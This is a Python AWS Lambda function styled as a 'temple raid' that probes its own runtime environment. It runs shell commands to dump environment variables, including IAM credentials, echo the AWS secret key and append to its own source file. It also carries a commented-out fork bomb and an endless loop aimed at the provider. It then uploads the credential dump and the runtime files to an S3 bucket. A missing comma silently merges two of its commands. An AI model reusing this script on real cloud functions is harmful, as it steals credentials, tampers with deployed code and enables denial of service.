import boto3, json, sys, os, base64


def lambda_handler(event, context):
    client = boto3.client('lambda', region_name='eu-central-1')
    
    commands = [
        ##################################################
        ### ENTERING THE TEMPLE                        ###
        ##################################################
        'whoami',                       # who am I? 
        'pwd',                          # where are we? 
        'ls',                           # take a first look around
        'cat /proc/1/cgroup',           # looking a little bit more around
        'cat /etc/os-release',          # On which OS are we running?
 
        ##################################################
        ### RAID THE TEMPLE                            ###
        ##################################################
        'env && env > /tmp/env.txt',    # IAM Credentials lurking in the dark
        'echo $AWS_SECRET_ACCESS_KEY',  # get the secret key
        
        ### are there any other treasures?
        'ls /var',
        'ls /var/runtime/',
        
        ### Attempts to messing around in the tomb and head to the exit
        'echo "TEST" >> /var/task/lambda_function.py'
        'cat /var/task/lambda_function.py',
        'echo "Yay, we got persistance" > /tmp/persistance.test',

        ##################################################
        ### ADDITIONAL THINGS (Optional)               ###
        ### ATTEMPTS TO DESTRUCT AND ESCAPE THE TEMPLE ###
        ##################################################
        # Reconing
        #'ulimit -a', # Find out the current maximum processes a 
        'cat /proc/cpuinfo > /tmp/cpu_info.txt', # Infos about the CPU
        
        # let's try to set up the bomb and annoy AWS 
        #"fork() {fork | fork & } fork", 
        #'for((i=1;i<=10000000;i+=2)); do sleep 10s; cat /proc/1/cgroup; echo "Still alive? $i times"; done'
    ]
    
    result = dict()
    
    ### Let's do the temple run 
    #            _
    #          _( }
    # -=  _  <<  \
    #    `.\__/`/\\
    #-=    '--'\\  `
    #   -=     //
    #          \)
    for command in commands:
        print("[+] Processing command: {}".format(command))
        print(os.system(command))
        print("[+] Done\n".format(command))
    
    
    ### Save our treasures in the backpack  
    ### => Don't forget to create a bucket named s3_backpack :)
    res_s3 = boto3.resource('s3')
    res_s3.meta.client.upload_file('/var/runtime/bootstrap.py', 's3_backpack', 'bootstrap.py')
    res_s3.meta.client.upload_file('/tmp/persistance.test', 's3_backpack', 'persistance.test.txt')
    res_s3.meta.client.upload_file('/tmp/cpu_info.txt', 's3_backpack', 'cpu_info.txt')
    res_s3.meta.client.upload_file('/tmp/env.txt', 's3_backpack', 'env.txt')
    res_s3.meta.client.upload_file('/var/task/lambda_function.py', 's3_backpack', 'lambda_function.py')
    
    return {'statusCode': 200}
